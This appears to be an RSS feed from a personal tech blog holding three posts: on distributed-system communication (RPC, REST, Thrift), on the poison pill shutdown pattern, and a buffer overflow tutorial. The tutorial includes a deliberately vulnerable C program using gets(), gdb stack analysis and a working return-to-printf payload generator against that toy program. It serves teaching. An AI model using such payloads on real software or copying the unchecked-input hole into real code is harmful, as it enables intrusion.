<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Pufan Jiang&#39;s Blog</title>
    <description>Pufan Jiang&#39;s personal blog, including lots of tech blogs, photo shooting etc.</description>
    <link>http://huangxuan.me/</link>
    <atom:link href="http://huangxuan.me/feed.xml" rel="self" type="application/rss+xml" />
    <pubDate>Fri, 19 Feb 2016 14:52:08 -0500</pubDate>
    <lastBuildDate>Fri, 19 Feb 2016 14:52:08 -0500</lastBuildDate>
    <generator>Jekyll v2.4.0</generator>
    
      <item>
        <title>Talking within Distributed System</title>
        <description>&lt;blockquote&gt;
  &lt;p&gt;This is a short series about some important concepts in distributed system.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;tldr&quot;&gt;TL;DR;&lt;/h2&gt;

&lt;p&gt;In this article, I first tried to explain what’s difference between communication in distributed system and local machine.&lt;/p&gt;

&lt;p&gt;Then I talked about two most popular way to communicate within a distributed system, i.e. message passing and RPC, and analyzed the advantages and disadvantages of them.&lt;/p&gt;

&lt;p&gt;Finally, I introduced two most successful protocol using these two communication idea, i.e. RESTful and Thrift.&lt;/p&gt;

&lt;h2 id=&quot;why-talking-within-distributed-system-is-different-from-local-machine&quot;&gt;Why talking within distributed system is different from local machine?&lt;/h2&gt;

&lt;p&gt;In a local machine, when process A is communicating with process B, it could be done in a synchronized fashion guaranteed by electrical circuit or the so-called bus built in your laptop or server. So the delivery time is always constant, corresponding to several clock cycles.&lt;/p&gt;

&lt;p&gt;The fundamental difference of distributed system and local machine is due to network unreliability. When machine A is sending message to or call function at machine B, there is not such bus connecting them so that they could only communicate through network. So either machine A get an acknowledgement message and it could be sure that machine B receive the message, or it has to wait indefinitely since it could never tell whether the message is lost or it is network congestion.&lt;/p&gt;

&lt;p&gt;So it is the case that I know what I know, but I don’t know what others know, and I don’t know what others know others know…&lt;/p&gt;

&lt;h2 id=&quot;an-example&quot;&gt;An example&lt;/h2&gt;

&lt;p&gt;Through the next of this post, we will examine a simple common example &lt;code&gt;distcp&lt;/code&gt;. So the semantic of &lt;code&gt;distcp&lt;/code&gt; is the same as &lt;code&gt;cp&lt;/code&gt; (copy) method, it copies data from one location to another.&lt;/p&gt;

&lt;p&gt;More specifically, when machine A runs &lt;code&gt;distcp path1/file path2&lt;/code&gt;, it copy &lt;code&gt;file&lt;/code&gt; from &lt;code&gt;path1&lt;/code&gt; to &lt;code&gt;path2&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&quot;message-passing&quot;&gt;Message Passing&lt;/h2&gt;

&lt;p&gt;So message passing is actually the most straightforward and also most widely used way to implement distributed system communication (think about Internet!).&lt;/p&gt;

&lt;p&gt;Message Passing defines two basic method, &lt;strong&gt;send()&lt;/strong&gt; and &lt;strong&gt;receive()&lt;/strong&gt;.  It sends the whole information including operator (in our case it is &lt;code&gt;distcp&lt;/code&gt;) and operands (in our case it is &lt;code&gt;file&lt;/code&gt; and &lt;code&gt;path&lt;/code&gt;) through network. And when receiver receives the message, it lookups the operator and finds corresponding local method and then finishes the job.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Advantages&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;It is straightforward/user-friendly.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Disadvantages&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;However, despite the good point of message passing, this method leaves a lot of burden to application programmer. A common message passing is very like this:&lt;br /&gt;
On sender’s side:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;MessageFactor.createMessage(&quot;distcp&quot;).setArgument(0, &quot;path1/file&quot;).setArgument(1, &quot;path2&quot;).send(ip of machine B)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;On receiver’s side:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;operator = receive().getOperator();
switch(operator) {
	case &quot;distcp&quot;: copy to path; break;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;There are two obvious problem.&lt;br /&gt;
1.Programmer needs to do lots of work to control the logic, especially on receiver’s side.&lt;br /&gt;
2.The program could not make use of compile check to make sure the sending message is correct. This significantly increase the possibility of runtime error.&lt;/p&gt;

&lt;h2 id=&quot;remote-procedure-call-rpc&quot;&gt;Remote Procedure Call (RPC)&lt;/h2&gt;

&lt;p&gt;So to reduce the burden of programmers and make our program more predictable, RPC is a good idea.&lt;/p&gt;

&lt;p&gt;The core idea of RPC is to provide an interface for both local and remote procedure call, so that programmer could call remote function just like call local function.&lt;/p&gt;

&lt;p&gt;So the RPC way of our function is very like to be this:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;register_path(&quot;path1&quot;, ip of machine A);
register_path(&quot;path2&quot;, ip of machine B);
dist(&quot;path1/file&quot;, &quot;path2&quot;);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And it is done! How to find the file and how to bind the data is left to RPC service. After binding the path and machine, the programmer doesn’t need to worry about the whole logic. Moreover, now we could at compile time check whether the programmer provides exactly two arguments , reducing runtime error.&lt;/p&gt;

&lt;p&gt;Also, it a lot of distributed system, e.g. Hadoop platform, there’s a master machine to take care of path binding, so the two &lt;code&gt;register_path&lt;/code&gt; method could be avoided as well!&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt; To understand how the RPC service is implemented, I encourage you to further read some posts online or this paper &lt;a href=&quot;http://doi.acm.org/10.1145/2080.357392&quot;&gt;Implementing remote procedure calls&lt;/a&gt; by Andrew and Bruce.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Advantages&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;1.RPC provide the abstraction of procedure call so that programmers could use these services easily just as using local methods.&lt;br /&gt;
2.It also helps reducing runtime errors.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Disadvantages&lt;/strong&gt;&lt;br /&gt;
Now RPC may seems really attracting, it has one important disadvantages compared to message passing – the service itself is much complicated.&lt;/p&gt;

&lt;p&gt;Yes, the user/programmer is relieved from handling logic and data binding themselves, but the API provider/RPC service provider need to do a lot of work, including defining interface, implementing logic etc. The complication is significant when testing some new functions, since the API may change frequently during development.&lt;/p&gt;

&lt;h2 id=&quot;real-world-implementation&quot;&gt;Real World Implementation&lt;/h2&gt;

&lt;p&gt;Now we scratched the surface of both two common communication ways, how and when do we prefer one to the other? Let’s see two most widely used communication protocol in web service today.&lt;/p&gt;

&lt;h3 id=&quot;restful&quot;&gt;RESTful&lt;/h3&gt;

&lt;p&gt;I’m not going to talk about what is RESTful. I assume you have already know what it is and hopefully you have used it several times in your previous projects.&lt;/p&gt;

&lt;p&gt;RESTful is a good example using the idea of message passing. For &lt;strong&gt;send()&lt;/strong&gt; method, it supports four operators, i.e. GET, PUT, POST and DELETE, and nearly unlimited number of operands (within bound of network limit of course). And &lt;strong&gt;receive()&lt;/strong&gt; method is handled by HTTP request.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Advantages&lt;/strong&gt;&lt;br /&gt;
1.Lightweight. Since RESTful API is often used for implementing CRUD operations in database, so the message is generally short.&lt;br /&gt;
2.User-friendly. RESTful has same semantics with HTTP request, thus learning curve of RESTful is almost zero degree!&lt;br /&gt;
3.Language/Platform independence. Since RESTful is nothing but HTTP request, it has no constraints on language or system platform.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Disadvantages&lt;/strong&gt;&lt;br /&gt;
The disadvantage of RESTful stems from HTTP protocol itself.&lt;/p&gt;

&lt;p&gt;One thing is RESTful does not support basic method other than HTTP’s methods. Although one could put operator inside body of HTTP request, but that would lose the lightweight property of RESTful.&lt;/p&gt;

&lt;p&gt;Another disadvantage is HTTP request is expensive. Each HTTP request is generally a blocking process, harming the scalability of system. (This is said be overcome in HTTP 2.0, I’m not quite familiar with HTTP 2.0, but this disadvantage holds for HTTP 1.1).&lt;/p&gt;

&lt;h3 id=&quot;thrift&quot;&gt;Thrift&lt;/h3&gt;

&lt;p&gt;My understanding of Thrift may not be correct and well-rounded, since I haven’t use Thrift a lot. But generally, Thrift is a protocol based on RPC so that to simplify remote call process and with goal of a fast, reliable and safe communication.&lt;/p&gt;

&lt;p&gt;To use Thrift, you need first define the RPC interface using Interface Definition Language (IDL). This interface is a constraint that both server and clients using the method should follow. After you defined the interface, it is Thrift that will take care of the underlying communication and compile time checking.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Advantages&lt;/strong&gt;&lt;br /&gt;
1.Provide compile time checking. Thrift is much stricter than RESTful, but the goodness is it could help avoid lots of small errors.&lt;br /&gt;
2.It is faaaaast. RPC generally take advantages of UDP protocol and binding acknowledgement message with next request to avoid overhead and amount of exchanging data.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Disadvantages&lt;/strong&gt;&lt;br /&gt;
It is obvious that Thrift is way complicated than RESTful API. It also doesn’t have a universal method name (e.g. GET in RESTful). Therefore developers need to first learn the interface of different Thrift library then could they move on.&lt;/p&gt;

&lt;h2 id=&quot;discussion&quot;&gt;Discussion&lt;/h2&gt;

&lt;p&gt;So how to choose among them? Like most design in computer science, there is no absolute yes or no to choose one protocol rather than the other.&lt;/p&gt;

&lt;p&gt;It has been a consensus that, generally, when developing light-weight api, especially those similar with CRUD operations, and when your api is used by lots of users, then RESTful may be better choice. While developing api that is internally used, or logically complicated, or fast is your first priority, then Thrift may be better.&lt;/p&gt;

&lt;p&gt;In comparison these protocol, here is a great &lt;a href=&quot;http://nordicapis.com/microservice-showdown-rest-vs-soap-vs-apache-thrift-and-why-it-matters/&quot;&gt;article&lt;/a&gt; by Kristopher  Sandoval. I quote part of the article here, but you should definitely read through that great post.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;REST, on the other hand, is like a pre-paid postcard. You’ve forgone the envelope in favor of a lightweight, succinct delivery device that is easy to interpret and handle, with your message quickly scribbled on the back. The postcard uses less material (bandwidth), is typically shorter in content, and might actually get to your neighbor faster because there’s less bulk to move around.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;Thrift is like a megaphone. When you point the megaphone at your neighbor, he implicitly knows you’re upset about something — and that you’re going to say it specifically to him. He knows what to do with the information, because the reaction a human has to a megaphone is pretty universal (assuming, of course, that your megaphone is louder than his drums). The message is sent in a lightweight but forceful manner that depends entirely on the receiver to properly process it, in this case your neighbor.&lt;/p&gt;
&lt;/blockquote&gt;
</description>
        <pubDate>Fri, 19 Feb 2016 14:41:00 -0500</pubDate>
        <link>http://huangxuan.me/2016/02/19/Talking-across-Distributed-System-Message-Passing-RPC-RESTful-and-Thrift/</link>
        <guid isPermaLink="true">http://huangxuan.me/2016/02/19/Talking-across-Distributed-System-Message-Passing-RPC-RESTful-and-Thrift/</guid>
        
        <category>Distributed System</category>
        
        <category>Network</category>
        
        <category>Communication</category>
        
        <category>Message Passing</category>
        
        <category>RPC</category>
        
        <category>Remote Procedure Call</category>
        
        <category>RESTful</category>
        
        <category>Thrift</category>
        
        
      </item>
    
      <item>
        <title>Secure Threats -- Buffer Overflow Attack -- Level 0</title>
        <description>&lt;p&gt;This is a short series about secure system. The goal is to show readers that our software system is far from robust and safe, and hopefully you would keep this in mind. (We are all that easy to overlook security problems.)&lt;/p&gt;

&lt;p&gt;This first several posts talk about a basic yet highly prevalent attack/hack solution to a software system that seems robust at first glance. This is called Buffer Overflow.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Pre-requisite&lt;/strong&gt; &lt;br /&gt;
The first pre-requisite is quite easy to catch up, but the second and third ones are fundamental pre knowledge.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Familiar with C language. (This series would use C program as example.) And know how to use a &lt;code&gt;gdb&lt;/code&gt; to debug C program.&lt;/li&gt;
  &lt;li&gt;Familiar with basic assembly language and be able to read assembly language. (No need to good at writing them!)&lt;/li&gt;
  &lt;li&gt;Know what’s a heap, stack, shared library and basically how program is mapped into memory. Or if you could understand what this figure is talking about.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;img src=&quot;http://i1371.photobucket.com/albums/ag320/otnt/ProgramMemoryOrganization_zpshdbibtlq.png&quot; alt=&quot;Program Memory Organization&quot; /&gt; &lt;br /&gt;
&lt;em&gt;(&lt;a href=&quot;http://www.amazon.com/Computer-Systems-Programmers-Perspective-2nd/dp/0136108040/ref=sr_1_3?ie=UTF8&amp;amp;qid=1454639716&amp;amp;sr=8-3&amp;amp;keywords=csapp&quot;&gt;Computer System : A Programmer’s Perspective 2nd&lt;/a&gt;)&lt;/em&gt;&lt;/p&gt;

&lt;h2 id=&quot;buffer-overflow-attack&quot;&gt;Buffer Overflow Attack&lt;/h2&gt;

&lt;p&gt;Great, now you are ready to hack a system, and I’m showing you a way.&lt;/p&gt;

&lt;h3 id=&quot;what-is-buffer-overflow&quot;&gt;What is Buffer Overflow&lt;/h3&gt;
&lt;p&gt;Buffer Overflow is an attack/hacking solution that takes advantage of such a vulnerability: when a victim host is trying to receive a message from an attacker, it doesn’t check the length of in-coming message, so the message could be arbitrary long and, as a result, overwrite some part of victim host’s  stack memory and make the hack.&lt;/p&gt;

&lt;h3 id=&quot;an-example-your-first-hacking-attack&quot;&gt;An Example (Your first hacking attack!)&lt;/h3&gt;

&lt;p&gt;To make this clearer, let’s see a typical example.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;/* basic.c */
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

/* server code, I&#39;m victim */
int main(int argc, char** argv)
{
    char buf[16] ;

    printf(&quot;Hi, I&#39;m server.\n&quot;);
    gets(buf);
    printf(&quot;you entered: %s\n&quot;, buf);

    return 0;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This piece of code seems okay at first glance, but the reason it suffers from a buffer overflow attack is the use of this &lt;code&gt;gets&lt;/code&gt; function. Basically &lt;code&gt;gets&lt;/code&gt; copy string from standard input to &lt;code&gt;buf&lt;/code&gt;. To understand why this is a problem, we need to look inside the program to know what is happening underneath. Yeah, I mean to read some assembly code.&lt;/p&gt;

&lt;p&gt;By running following script,&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;gcc -o basic basic.c -m32
objdump -d basic
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;we could get assembly code of &lt;code&gt;basic&lt;/code&gt;. &lt;br /&gt;
(&lt;strong&gt;Note we add a &lt;code&gt;-m32&lt;/code&gt; here to compile it to a 32-bit version&lt;/strong&gt;)&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-assembly&quot;&gt;08048480 &amp;lt;main&amp;gt;:
 ......
 8048495:  8d 44 24 10        lea    0x10(%esp),%eax # some padding
 8048499:  89 04 24           mov    %eax,(%esp)  # put this address as argument for gets function
 804849c:  e8 9f fe ff ff     call   8048340 &amp;lt;gets@plt&amp;gt;
 ......
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;I’m not going to talk about what exactly these assembly do. They are pretty straightforward if you have some experience with assembly language and also notice I add some comments to help you catch the idea.&lt;/p&gt;

&lt;h4 id=&quot;now-is-key-point&quot;&gt;&lt;strong&gt;Now is key point.&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;Then what &lt;code&gt;gets&lt;/code&gt; function does is it go through standard input and copy byte by byte to &lt;code&gt;buf&lt;/code&gt; until it met a &lt;code&gt;null&lt;/code&gt; terminator. However, the &lt;code&gt;gets&lt;/code&gt; function doesn’t check input length! So what if we input a very long sentence?&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;-bash-4.2$ echo &quot;a verrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrry long sentence&quot; | ./basic
Hi, I&#39;m server.
you entered: a verrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrry long sentence
Segmentation fault (core dumped)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The problem is the input is too long so that it override some part of original stack. This could be a disaster since stack is used to keep important variable value.&lt;/p&gt;

&lt;p&gt;And this is why this kind of attack is called Buffer Overflow Attack.&lt;/p&gt;

&lt;h2 id=&quot;to-do-a-real-attack&quot;&gt;To do a real attack&lt;/h2&gt;

&lt;p&gt;To do a real attack, i.e. let the program do something you intend it to do, rather than just crash, we need more work and more analysis.&lt;/p&gt;

&lt;h4 id=&quot;analysis&quot;&gt;&lt;strong&gt;Analysis&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;By using &lt;code&gt;gdb&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;(gdb) b *0x804849c
Breakpoint 1 at 0x804849c
(gdb) r
Starting program: basic 
Hi, I&#39;m server.

Breakpoint 1, 0x0804849c in main ()
(gdb) i r esp
esp            0xffffd210       0xffffd210
(gdb) x/wx 0xffffd210
0xffffd210:     0xffffd220
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;we could find right before &lt;code&gt;gets&lt;/code&gt;  is called, &lt;code&gt;esp&lt;/code&gt; is pointing to &lt;code&gt;0xffffd220&lt;/code&gt;, which means our input message will be written to this address. &lt;br /&gt;
Also, if we set breakpoint at beginning of &lt;code&gt;main&lt;/code&gt; function,&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;(gdb) b *0x0x8048480
Breakpoint 2 at 0x8048480
(gdb) r
Starting program: basic
Breakpoint 2, 0x08048480 in main ()
(gdb) i r esp
esp            0xffffd23c       0xffffd23c
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;we could find return address for &lt;code&gt;main&lt;/code&gt; function is saved at  &lt;code&gt;0xffffd23c&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Did you find the secret? The offset between the return address and the address we are going to write is only &lt;code&gt;0xffffd23c - 0xffffd220 = 0x1C = 28&lt;/code&gt;. This means if our input message is 28 characters or more, then we could overwrite the return address of &lt;code&gt;main&lt;/code&gt; function!&lt;/p&gt;

&lt;p&gt;And let’s remind what return instruction does. It puts the value pointed by &lt;code&gt;esp&lt;/code&gt; to &lt;code&gt;eip&lt;/code&gt;,  increment &lt;code&gt;esp&lt;/code&gt; by 4 bytes, and execute the code pointed by &lt;code&gt;eip&lt;/code&gt;. So this means if we change the value of return address, we could let program go to some surprised place and execute some surprised code!&lt;/p&gt;

&lt;p&gt;Moreover, if we construct our input message using executable code and let the return address go to our code, then we could let program do whatever we want! And this closes our analysis! Bravo!&lt;/p&gt;

&lt;h4 id=&quot;sum-up&quot;&gt;&lt;strong&gt;Sum up&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;Let’s put the pieces together. To do a basic buffer overflow attack, we need to…&lt;br /&gt;
1.Find the address where your input message is going to write.&lt;br /&gt;
2.Find the most recent return address that is larger than the address in point 1.&lt;br /&gt;
3.Carefully calculate the offset of these two addresses and design your input message so that they could be executed by CPU to do some surprisingly fun job.&lt;/p&gt;

&lt;h4 id=&quot;lets-hack-our-not-so-robust-program&quot;&gt;&lt;strong&gt;Let’s Hack Our ‘Not-so-Robust’ Program&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;The normal execution of &lt;code&gt;basic&lt;/code&gt; program is prompt exactly same thing as we input. Now we would like it to print &lt;code&gt;I&#39;m hacked!&lt;/code&gt; in a funny way.&lt;/p&gt;

&lt;p&gt;To print something, we still need the built-in &lt;code&gt;print&lt;/code&gt; function in &lt;code&gt;stdlib&lt;/code&gt;. Take a look at assembly code again,&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;(gdb) p &amp;amp;printf
$2 = (&amp;lt;data variable, no debug info&amp;gt; *) 0xf7e32f60 &amp;lt;printf&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;To print something, we need to make sure &lt;code&gt;esp&lt;/code&gt; is pointing to what we want to print (i.e. &lt;code&gt;I&#39;m hacked!&lt;/code&gt; in this case), and then call &lt;code&gt;printf&lt;/code&gt; function! The input message should be like this:&lt;br /&gt;
[several padding to return address] – [address to &lt;code&gt;printf&lt;/code&gt;] – [pointer to hacking message]&lt;/p&gt;

&lt;p&gt;To call the &lt;code&gt;printf&lt;/code&gt; function is easy, we just need to overwrite the return address in &lt;code&gt;main&lt;/code&gt; function with &lt;code&gt;printf&lt;/code&gt; address, which we’ve already figured out as  &lt;code&gt;0xf7e32f60&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Then where is the hacking message? Remember the &lt;code&gt;printf&lt;/code&gt; function print message out until it find a &lt;code&gt;null&lt;/code&gt; terminator. Therefore we could not put the hacking message at front of input message and followed by the padding, since in this way we would print rubbish that we don’t want to. So we have to put them at the end of input message. Thus, the input message should be like this:&lt;br /&gt;
[several padding to return address] – [address to &lt;code&gt;printf&lt;/code&gt;] – [pointer to hacking message] – [hacking message]&lt;/p&gt;

&lt;p&gt;One last thing, we need some padding at after return to &lt;code&gt;printf&lt;/code&gt;, this is because we use &lt;code&gt;printf&lt;/code&gt; function not by “call” but by “return”. As we analyzed before, just before call &lt;code&gt;printf&lt;/code&gt;, we make sure &lt;code&gt;esp&lt;/code&gt; pointing to message we want to print out. But when we use “return” to call a function, it first put &lt;code&gt;esp&lt;/code&gt; to &lt;code&gt;eip&lt;/code&gt; and then pop &lt;code&gt;esp&lt;/code&gt; so that &lt;code&gt;esp&lt;/code&gt; will move up by 4 bytes. Also, the value in this padding is the return address after return from &lt;code&gt;printf&lt;/code&gt;, i.e. the program will try to execute code at the position of this padding value. So we could put an &lt;code&gt;exit&lt;/code&gt; here to let the program stop.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;(gdb) p &amp;amp;exit
$5 = (&amp;lt;text variable, no debug info&amp;gt; *) 0xf7e17b10 &amp;lt;exit&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Okay! Let’s hack it!&lt;br /&gt;
We know…&lt;br /&gt;
1. The address we are going to write from is: &lt;code&gt;0xffffd220&lt;/code&gt;&lt;br /&gt;
2. The original return address is at: &lt;code&gt;0xffffd23c&lt;/code&gt;&lt;br /&gt;
3. The return address need to overwrite as &lt;code&gt;0xf7e32f60&lt;/code&gt;&lt;br /&gt;
4. The exit address is &lt;code&gt;0xf7e17b10&lt;/code&gt;&lt;br /&gt;
5. And we put hacking message at the end: &lt;code&gt;I&#39;m hacked!&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;So, what we need is:&lt;br /&gt;
&lt;code&gt;0xffffd220&lt;/code&gt; : 28 &lt;code&gt;\x90&lt;/code&gt; as padding&lt;br /&gt;
……&lt;br /&gt;
&lt;code&gt;0xffffd23c&lt;/code&gt; : &lt;code&gt;0xf7e32f60&lt;/code&gt; address to call &lt;code&gt;printf&lt;/code&gt;&lt;br /&gt;
&lt;code&gt;0xffffd240&lt;/code&gt; : &lt;code&gt;0xf7e17b10&lt;/code&gt; address to exit, also as padding&lt;br /&gt;
&lt;code&gt;0xffffd244&lt;/code&gt; : &lt;code&gt;0xffffd248&lt;/code&gt; pointer to printing message&lt;br /&gt;
&lt;code&gt;0xffffd248&lt;/code&gt; : &lt;code&gt;I&#39;m hacked!&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Another important thing we need to keep in mind is, our system is generally small-endian. This means instead of &lt;code&gt;0xf7e32f60&lt;/code&gt; as is human readable, we need to put &lt;code&gt;0x602fe3f7&lt;/code&gt; in our input message. The same thing holds to &lt;code&gt;0xffffd248&lt;/code&gt; and &lt;code&gt;0xf7e17b10&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;So, based on all these analysis. We get our input message:&lt;br /&gt;
28 &lt;code&gt;\x90&lt;/code&gt;  &lt;code&gt;0x602fe3f7&lt;/code&gt; &lt;code&gt;0x107be1f7&lt;/code&gt; &lt;code&gt;0x48d2ffff&lt;/code&gt; &lt;code&gt;I&#39;m hacked!&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;To generate the text we could have a helper program &lt;code&gt;hack&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;/* basic hack.c */
#include &amp;lt;stdio.h&amp;gt;

int main(int argc, char** argv)
{
        int i = 0;
        //padding
        for(i = 0; i &amp;lt; 28; i++)
        {
                printf(&quot;\x90&quot;);
        }
        printf(&quot;\x60\x2f\xe3\xf7&quot;);//address to printf
        printf(&quot;\xa1\x83\x04\x08&quot;);//address to exit
        printf(&quot;\x48\xd2\xff\xff&quot;);//address to print message
        printf(&quot;I&#39;m Hacked!\n&quot;);

        return 0;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Then compile it and save to a file &lt;code&gt;hack.txt&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;-bash-4.2$ gcc -o hack hack.c                                                                                      
-bash-4.2$ ./hack &amp;gt; hack.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Finally use &lt;code&gt;gdb&lt;/code&gt; to test it!&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;(gdb) r &amp;lt; hack.txt 
Starting program: basic &amp;lt; hack.txt
Hi, I&#39;m server.
you entered: ????????????????????????????`/{H?I&#39;m Hacked!
I&#39;m Hacked![Inferior 1 (process 41057) exited with code 0111]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt; At the end of output, it says program exited with code 0111. This means program doesn’t exit normally. This is because the &lt;code&gt;exit&lt;/code&gt; function also use &lt;code&gt;esp&lt;/code&gt; as exit code, but in our program &lt;code&gt;esp&lt;/code&gt; saves address to message. To overcome this problem, we need to use ROP(Return-Oriented-Programming) technique. See following posts!&lt;/p&gt;

&lt;p&gt;Last but not least. If you test this attack without &lt;code&gt;gdb&lt;/code&gt;, you’ll get&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;-bash-4.2$ ./basic &amp;lt; hack.txt 
Hi, I&#39;m server.
you entered: ????????????????????????????`/{H?I&#39;m Hacked!
Segmentation fault (core dumped)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;This is because the so-called ASLR(Address Space Layout Randomization) defense technique. We’ll talk about how to overcome this defense in following posts.&lt;/p&gt;

&lt;p&gt;And this ends the very basic Buffer Overflow Attack. Hope you enjoy it!&lt;/p&gt;
</description>
        <pubDate>Sun, 14 Feb 2016 14:38:00 -0500</pubDate>
        <link>http://huangxuan.me/2016/02/14/Secure-Threats-Buffer-Overflow-Attack-Level-0/</link>
        <guid isPermaLink="true">http://huangxuan.me/2016/02/14/Secure-Threats-Buffer-Overflow-Attack-Level-0/</guid>
        
        <category>Buffer Overflow</category>
        
        <category>Secure</category>
        
        
      </item>
    
      <item>
        <title>Poison Pill Pattern</title>
        <description>&lt;h1 id=&quot;poison-pill-pattern&quot;&gt;Poison Pill Pattern&lt;/h1&gt;

&lt;h3 id=&quot;why-need-this&quot;&gt;Why need this?&lt;/h3&gt;
&lt;p&gt;In a producer consumer problem, how could threads know when to stop? If just interrupt all threads abruptly, maybe some jobs in the queue are not handled properly. So we want to find a way to tell all threads that you should stop, and stop decently.&lt;/p&gt;

&lt;h3 id=&quot;how-it-works&quot;&gt;How it works?&lt;/h3&gt;
&lt;p&gt;The idea is extremely simple. When producer wants to stop the service, it sends a special message (poison pill) into the queue and stops it self, when consumer gets this message, it closes it self as well.&lt;/p&gt;

&lt;h3 id=&quot;what-if-multiply-producers-and-multiply-consumers&quot;&gt;What if multiply producers and multiply consumers?&lt;/h3&gt;
&lt;ol&gt;
  &lt;li&gt;If only one producer and consumer, then it’s totally fine.&lt;/li&gt;
  &lt;li&gt;If there are several producers and one consumer, each producer could send a poison pill to consumer and stop itself. When consumer gets same number of poison pills, then it stop running.&lt;/li&gt;
  &lt;li&gt;If there are one producer and several consumers, then producer send poison pills of same number as consumers to queue. Each consumer stops itself when get a poison pill.&lt;/li&gt;
  &lt;li&gt;If there are multiple producers and multiple consumers, then each producer send poison pill of same number as consumers to queue. Each consumer stops itself when get poison pills of same number as producer.&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;what-is-the-problem&quot;&gt;What is the problem?&lt;/h3&gt;
&lt;p&gt;This solution suppose producers and consumers know the quantity of each other.&lt;br /&gt;
Also, if we have N producers and M consumers, then number of poison pills will be N*M, which could be large.&lt;/p&gt;

&lt;h3 id=&quot;alternative-solution&quot;&gt;Alternative Solution&lt;/h3&gt;
&lt;p&gt;One alternative solution is we relax the constraints so that consumers could also offer messages into queue, but only when it is trying to stop the whole service.&lt;br /&gt;
On producers’ side, when all producers are going to leave the service, the last producer send a poison pill to the queue. This could be done by several ways, one way is to elect a leader so the leader send the poison pill and then every producer leaves.&lt;br /&gt;
On consumers’ side, when any of consumers get a poison pill, it first the poison pill back to queue and leave the service. So that all consumers will finally leave the service.&lt;br /&gt;
This solution is based on that producers know each other, and consumers know each other, but producers and consumers don’t know each other, which makes more sense in real world.&lt;/p&gt;

&lt;h3 id=&quot;reference&quot;&gt;Reference&lt;/h3&gt;
&lt;ol&gt;
  &lt;li&gt;“Poison Pill Shutdown” in Java Concurrency in Practice&lt;/li&gt;
&lt;/ol&gt;
</description>
        <pubDate>Thu, 11 Feb 2016 14:37:00 -0500</pubDate>
        <link>http://huangxuan.me/2016/02/11/poison-pill-pattern/</link>
        <guid isPermaLink="true">http://huangxuan.me/2016/02/11/poison-pill-pattern/</guid>
        
        <category>Design Pattern</category>
        
        <category>Multi-thread</category>
        
        <category>Producer Consumer</category>
        
        
      </item>
    
  </channel>
</rss>
